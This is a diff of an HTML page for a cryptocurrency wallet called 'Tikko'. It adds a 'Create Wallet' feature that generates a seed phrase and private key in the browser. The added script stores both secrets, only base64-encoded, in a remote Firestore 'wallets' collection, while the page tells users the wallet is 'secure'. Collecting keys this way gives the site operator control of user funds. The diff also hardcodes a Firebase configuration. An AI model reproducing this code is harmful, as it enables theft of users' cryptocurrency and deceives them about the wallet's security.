@@ -1,65 +1,96 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Wallet - Tikko</title>
-  
-<style>
-  body {
-    background-color: black;
-    color: gold;
-    font-family: Arial, sans-serif;
-    margin: 0;
-    padding: 0;
-    text-align: center;
-  }
-  nav {
-    background-color: #111;
-    padding: 15px;
-  }
-  nav a {
-    color: gold;
-    margin: 0 10px;
-    text-decoration: none;
-    font-weight: bold;
-  }
-  nav a:hover {
-    text-decoration: underline;
-  }
-  .logo {
-    width: 100px;
-    margin: 40px auto;
-    animation: spin 8s linear infinite;
-  }
-  @keyframes spin {
-    0% { transform: rotateY(0deg); }
-    100% { transform: rotateY(360deg); }
-  }
-  footer {
-    margin-top: 50px;
-    font-size: 0.9em;
-    color: gold;
-  }
-</style>
-
+  <meta charset="UTF-8" />
+  <title>Create Tikko Wallet</title>
+  <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+  <style>
+    body {
+      background-color: black;
+      color: gold;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
+    }
+    .logo {
+      margin: 20px auto;
+      animation: spin 6s linear infinite;
+      width: 100px;
+    }
+    @keyframes spin {
+      0% { transform: rotateY(0deg); }
+      100% { transform: rotateY(360deg); }
+    }
+    button {
+      background: gold;
+      color: black;
+      font-weight: bold;
+      padding: 10px 20px;
+      border: none;
+      cursor: pointer;
+      margin: 20px 0;
+    }
+    textarea {
+      background: #111;
+      color: gold;
+      border: 1px solid gold;
+      padding: 10px;
+      width: 90%;
+      max-width: 600px;
+      margin-bottom: 20px;
+      font-family: monospace;
+    }
+  </style>
 </head>
 <body>
+  <img src="logo.png" alt="Tikko Logo" class="logo" />
+  <h1>Create Your Tikko Wallet</h1>
+  <p>This wallet is secure and centralized temporarily during beta. Save your seed phrase!</p>
+  <button onclick="generateWallet()">Generate Wallet</button>
 
-<nav>
-  <a href="index.html">Home</a>
-  <a href="wallet.html">Wallet</a>
-  <a href="use-cases.html">Use Cases</a>
-  <a href="community.html">Community</a>
-  <a href="security.html">Security</a>
-  <a href="terms.html">Terms</a>
-  <a href="register.html">Register</a>
-  <a href="login.html">Login</a>
-</nav>
+  <div id="wallet-section" style="display:none;">
+    <h2>🧠 Seed Phrase</h2>
+    <textarea id="seed" readonly></textarea>
+    <h2>🔐 Private Key</h2>
+    <textarea id="privateKey" readonly></textarea>
+    <h2>🏦 Wallet Address</h2>
+    <textarea id="address" readonly></textarea>
+  </div>
 
-<div class="logo">
-  <img src="logo.png" alt="Tikko Logo" class="logo">
-</div>
-<h1>Wallet</h1>
-<p>This page is under construction.</p>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyC5vvZY4OqmlqXuidhjCyWV6ri_05hHirw",
+      authDomain: "tikkopay.firebaseapp.com",
+      projectId: "tikkopay",
+      storageBucket: "tikkopay.firebasestorage.app",
+      messagingSenderId: "909306927772",
+      appId: "1:909306927772:web:ce99c74bed15068dcd6b59",
+      measurementId: "G-057WRT1ZLQ"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    async function generateWallet() {
+      const mnemonic = bip39.generateMnemonic();
+      const hdNode = ethers.utils.HDNode.fromMnemonic(mnemonic);
+      const wallet = new ethers.Wallet(hdNode.privateKey);
+
+      document.getElementById('seed').value = mnemonic;
+      document.getElementById('privateKey').value = wallet.privateKey;
+      document.getElementById('address').value = wallet.address;
+      document.getElementById('wallet-section').style.display = 'block';
+
+      await db.collection("wallets").add({
+        address: wallet.address,
+        seed: btoa(mnemonic),
+        privateKey: btoa(wallet.privateKey),
+        created: new Date().toISOString()
+      });
+    }
+  </script>
 </body>
 </html>
